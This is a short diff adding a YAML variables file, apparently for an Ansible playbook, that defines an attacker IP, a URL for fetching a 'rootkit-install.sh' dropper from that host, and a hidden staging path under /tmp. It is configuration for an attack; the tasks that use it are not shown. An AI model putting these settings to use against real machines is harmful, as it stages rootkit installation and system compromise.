@@ -1,0 +1,5 @@
+---
+username: cyrano
+attacker_ip: "192.168.40.5"
+dropper_url: "http://{{ attacker_ip }}/rootkit-install.sh"
+dropper_path: /tmp/.rk_install.sh
